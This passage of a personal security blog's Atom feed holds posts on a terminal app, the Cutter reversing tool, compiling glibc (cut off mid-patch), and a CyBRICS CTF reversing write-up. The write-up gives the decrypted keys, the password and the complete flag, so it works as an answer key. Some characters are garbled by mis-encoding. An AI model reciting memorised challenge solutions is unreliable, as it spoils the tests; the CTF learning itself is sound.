<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0x14&#39;s Blog | ÁÉ≠Áà±ÂàÜ‰∫´</title>
  
  <subtitle>0x14</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.yof3ng.xyz/"/>
  <updated>2019-07-23T10:38:22.000Z</updated>
  <id>http://www.yof3ng.xyz/</id>
  
  <author>
    <name>0x14</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Awesome_Terminal</title>
    <link href="http://www.yof3ng.xyz/2019/07/23/Awesome-Terminal/"/>
    <id>http://www.yof3ng.xyz/2019/07/23/Awesome-Terminal/</id>
    <published>2019-07-23T10:26:19.000Z</published>
    <updated>2019-07-23T10:38:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>This page is to show a good terminal named ‚ÄúTerminus‚Äùüòé‚Ä¶</p><a id="more"></a><h1 id="Terminus"><a href="#Terminus" class="headerlink" title="Terminus"></a>Terminus</h1><p>It is an open source project‚Ä¶Until now already possess over ten thousands stars‚Ä¶</p><p>Here is a flyer page:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183221.png" alt=""></p><p>And mine look as follow:</p><hr><p><code>Home page</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183348.png" alt=""></p><p><code>SSH page</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183525.png" alt=""></p><p>It is really awesome! As you can seeüòÑ.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This page is to show a good terminal named ‚ÄúTerminus‚Äùüòé‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="tools" scheme="http://www.yof3ng.xyz/categories/tools/"/>
    
    
      <category term="Tools" scheme="http://www.yof3ng.xyz/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Cybrics_Matreshka_Reverse</title>
    <link href="http://www.yof3ng.xyz/2019/07/22/Cybrics-Matreshka-Reverse/"/>
    <id>http://www.yof3ng.xyz/2019/07/22/Cybrics-Matreshka-Reverse/</id>
    <published>2019-07-22T07:09:11.000Z</published>
    <updated>2019-07-22T13:41:01.381Z</updated>
    
    <content type="html"><![CDATA[<p>I try to play the Cybrics CTF yesterdayüòÄ‚Ä¶And the truth tell me that how suck i am‚Ä¶ Btw‚Ä¶The challenges of Cybrics is very interesting and fresh.</p><a id="more"></a><h1 id="Cybrics-Matreshka-Reverse"><a href="#Cybrics-Matreshka-Reverse" class="headerlink" title="Cybrics_Matreshka_Reverse"></a>Cybrics_Matreshka_Reverse</h1><blockquote><p>CyBRICS is a computer security competition (CTF) organized in a cross-university effort by BRICS countries academia.</p><p>The event is organized by CyBRICS coordinating universities: <a href="https://en.itmo.ru/en/" target="_blank" rel="noopener">ITMO University</a> (RU), <a href="http://en.scu.edu.cn/" target="_blank" rel="noopener">SiChuan University</a> (CN), <a href="https://www.nitw.ac.in/" target="_blank" rel="noopener">NIT Warangal</a> (IN), <a href="http://www.iitkgp.ac.in/" target="_blank" rel="noopener">IIT Kharagpur</a> (IN), <a href="https://www.wits.ac.za/" target="_blank" rel="noopener">Wits University</a> (ZA), <a href="https://www.tut.ac.za/" target="_blank" rel="noopener">Tshwane University of Technology</a> (ZA).</p><p>The competition is made and run by <a href="https://vk.com/spbctf" target="_blank" rel="noopener">SPbCTF</a> meetups crew (members of CTF teams LC‚ÜØBC, SiBears, PeterPEN, Yozik).</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722151354.png" alt=""></p><h2 id="Challenge-Matreshka"><a href="#Challenge-Matreshka" class="headerlink" title="Challenge_Matreshka"></a>Challenge_Matreshka</h2><p>Although it is easy for most individuals, i think it‚Äôs valuable.</p><p>appendix: <code>Code2.class</code> and <code>data2.bin</code></p><h2 id="Step1-Java-analysis"><a href="#Step1-Java-analysis" class="headerlink" title="Step1: Java analysis"></a>Step1: Java analysis</h2><p>You can get the source code from Code2.class by the <code>jd-gui</code> or other tools like it.</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>PrintStream<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>Cipher<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKey<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKeyFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span>DESKeySpec<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Code2</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span>    <span class="token keyword">throws</span> Exception  <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayOfByte2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> arrayOfByte1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Then you can know the <code>data.bin</code> is actually encoded‚Ä¶ So how to decode it and get the <code>stage2.bin</code>?</p><p>Obviously, the value of ‚Äúuser.name‚Äù is the key‚Ä¶Make sure it is the property of challenge environmentÔºånot our computer‚Äôs ‚Äúuser.name‚Äù‚Ä¶</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//...Ellipsis</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    String username <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">,</span><span class="token string">"matreha!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//...</span></code></pre><p>Then compile the program and run it‚Ä¶</p><h2 id="Step2-Golang-analysis"><a href="#Step2-Golang-analysis" class="headerlink" title="Step2: Golang analysis"></a>Step2: Golang analysis</h2><p>You have got the <code>stage2.bin</code> from step1.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722154552.png" alt=""></p><p>According to the combination of static analysis and dynamic analysis, we can know the program logic as followsÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722205942.png" alt=""></p><p>It should be noted that when XOR reaches the last byte, the loop produces some differences, and it is easy to ignore the key of the last byte, but this byte can be inferred‚Ä¶‚Ä¶</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722210542.png" alt=""></p><p>Dynamically debuggingÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211126.png" alt=""></p><p>The R8 stores the key byte that we should get‚Ä¶RSI stores our directory string‚Ä¶There is seventeen key bytes totally‚Ä¶After getting all the key bytes, just xor it with the Built-in ciphertext‚Ä¶</p><p><code>Built-in ciphertext(hex)</code>:0x53ddc587e46399144fa4142dc42404c0b0</p><p><code>Key(hex)</code>:0x38afaaf48c08f84b22c5605fa1576cabd1</p><pre class=" language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2sIn <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> n2s<span class="token punctuation">(</span><span class="token number">0x53ddc587e46399144fa4142dc42404c0b0</span><span class="token operator">^</span><span class="token number">0x38afaaf48c08f84b22c5605fa1576cabd1</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'kroshka_matreshka'</span></code></pre><p>Then i mv the program in a directory named ‚Äòkroshka_matreshka‚Äô and run it‚Ä¶A result.pyc‚Ä¶wellüòé</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211935.png" class="lazyload"></p><p>ApparentlyÔºåwe arrived hereÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211827.png" class="lazyload"></p><h2 id="Step3ÔºöPython-analysis"><a href="#Step3ÔºöPython-analysis" class="headerlink" title="Step3ÔºöPython analysis"></a>Step3ÔºöPython analysis</h2><p>Decompiling <code>result.pyc</code>, then you can see the logic from source code‚Ä¶This is an eight-byte key cycle XOR encryption algorithm.</p><p>You have known the flag is begin with <code>cybrics{</code>Ôºåso you can directly get the keyÔºö<code>Kr0H4137</code>Ôºåthen you just get flag by decrypting the ciphertext‚Ä¶üÜó</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> result <span class="token keyword">import</span> <span class="token operator">*</span>Enter key to get flag<span class="token punctuation">:</span>Kr0H4137cybrics<span class="token punctuation">{</span>M4TR35HK4_15_B35T<span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span></code></pre><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>It‚Äôs a nice and full day!üòÑ</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;I try to play the Cybrics CTF yesterdayüòÄ‚Ä¶And the truth tell me that how suck i am‚Ä¶ Btw‚Ä¶The challenges of Cybrics is very interesting and fresh.&lt;/p&gt;
    
    </summary>
    
      <category term="Reverse" scheme="http://www.yof3ng.xyz/categories/Reverse/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
      <category term="Reverse" scheme="http://www.yof3ng.xyz/tags/Reverse/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Awesome_Cutter_radare2</title>
    <link href="http://www.yof3ng.xyz/2019/07/21/Awesome-Cutter-radare2/"/>
    <id>http://www.yof3ng.xyz/2019/07/21/Awesome-Cutter-radare2/</id>
    <published>2019-07-21T08:54:43.000Z</published>
    <updated>2019-07-21T09:01:27.751Z</updated>
    
    <content type="html"><![CDATA[<p>Cutter is a free and open-source GUI for radare2 reverse engineering framework. Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineersüòé.</p><a id="more"></a><p>Github repository link: <a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener">https://github.com/radareorg/cutter</a></p><p>Instruction doc linkÔºö<a href="https://cutter.re/docs/" target="_blank" rel="noopener">https://cutter.re/docs/</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190721170055.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Cutter is a free and open-source GUI for radare2 reverse engineering framework. Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineersüòé.&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://www.yof3ng.xyz/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://www.yof3ng.xyz/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Compile_Glibc_Manually</title>
    <link href="http://www.yof3ng.xyz/2019/07/20/Manually-Compile-Glibc/"/>
    <id>http://www.yof3ng.xyz/2019/07/20/Manually-Compile-Glibc/</id>
    <published>2019-07-20T07:04:41.000Z</published>
    <updated>2019-07-20T08:59:14.437Z</updated>
    
    <content type="html"><![CDATA[<p>If you want to learn some fantastic and advance technique about Security, You have to command some fundamental knowledge‚Ä¶‚Ä¶</p> <a id="more"></a><h1 id="Compile-Glibc-Manually"><a href="#Compile-Glibc-Manually" class="headerlink" title="Compile_Glibc_Manually"></a>Compile_Glibc_Manually</h1><blockquote><p>Today i will show you how to compile a glibc manually.</p></blockquote><h2 id="What-is-Glibc"><a href="#What-is-Glibc" class="headerlink" title="What is Glibc?"></a>What is Glibc?</h2><p>Refer from the <code>stack overflow</code>:<a href="https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for" target="_blank" rel="noopener">https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for</a></p><blockquote><p>It‚Äôs the implementation of <em>Standard C library</em> described in C standards plus some extra useful stuffs which are not strictly standard but used frequently.</p><p>Its main contents are :</p><p>1) C library described in ANSI,c99,c11 standards. It includes macros, symbols, function implementations etc.(printf(),malloc() etc)</p><p>2) POSIX standard library. The ‚Äúuserland‚Äù glue of system calls. (open(),read() etc. Actually glibc does not ‚Äúimplement‚Äù system calls. kernel does it. But glibc provides the user land interface to the services provided by kernel so that user application can use a system call just like a ordinary function.</p><p>3) Also some nonstandard but useful stuff.</p><p>‚Äúuse the force, read the source ‚Äú</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$git</span> clone git://sourceware.org/git/glibc.git</code></pre></blockquote><h2 id="What-is-ld-so"><a href="#What-is-ld-so" class="headerlink" title="What is ld.so?"></a>What is ld.so?</h2><p>ld.so : Dynamic linker of system‚Ä¶Used for Executed-file like a.out</p><p>ld-linux.so: Dynamic linker of linux‚Ä¶Used for ELF format Executed-file.</p><pre class=" language-bash"><code class="language-bash"> ‚úò ‚ö° root@xiaoyifeng ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file ./elf/ld-linux-x86-64.so.2</span>./elf/ld-linux-x86-64.so.2: symbolic <span class="token function">link</span> to ld.so</code></pre><h2 id="What-is-libc-so"><a href="#What-is-libc-so" class="headerlink" title="What is libc.so?"></a>What is libc.so?</h2><p>libc.so : Glibc binary is called libc.so.6</p><p>Actually libc.so.6 is a symbolic link to libc.so‚Ä¶‚Ä¶ </p><pre class=" language-bash"><code class="language-bash"> ‚ö° root@xiaoyifeng ÓÇ∞ ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file libc.so.6</span>libc.so.6: symbolic <span class="token function">link</span> to libc.so</code></pre><p><a href="https://stackoverflow.com/questions/11372872/what-is-the-role-of-libcglibc-in-our-linux-app" target="_blank" rel="noopener">What is libc?</a></p><h2 id="Compiling-it"><a href="#Compiling-it" class="headerlink" title="Compiling it!"></a>Compiling it!</h2><blockquote><p>Reference:<a href="https://www.jianshu.com/p/ee1ad4044ef7" target="_blank" rel="noopener">https://www.jianshu.com/p/ee1ad4044ef7</a></p></blockquote><p>Before compile itÔºåyou should download the special glibc source code and uncompressed it‚Ä¶‚Ä¶Then you should mkdir two another directory called for build and compiling file‚Ä¶‚Ä¶like this:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720155219.png" alt=""></p><h3 id="Step1-configure"><a href="#Step1-configure" class="headerlink" title="Step1:configure"></a>Step1:configure</h3><p>It‚Äôs important to add <code>--disable-werror</code>‚Ä¶‚Ä¶</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720152708.png" alt=""></p><h3 id="Step2-make"><a href="#Step2-make" class="headerlink" title="Step2: make"></a>Step2: make</h3><p>Maybe you would encounter this bad problem. : <code>can&#39;t be versioned to common symbol &#39;loc1&#39;</code></p><p>Just find the solution in this page : <a href="https://www.e-learn.cn/content/qita/664508" target="_blank" rel="noopener">https://www.e-learn.cn/content/qita/664508</a></p><pre class=" language-c"><code class="language-c"><span class="token operator">--</span><span class="token operator">-</span> a<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c<span class="token operator">++</span><span class="token operator">+</span> b<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c@@ <span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">14</span> <span class="token operator">+</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">15</span> @@ <span class="token macro property">#<span class="token directive keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)</span><span class="token operator">-</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1<span class="token punctuation">;</span><span class="token 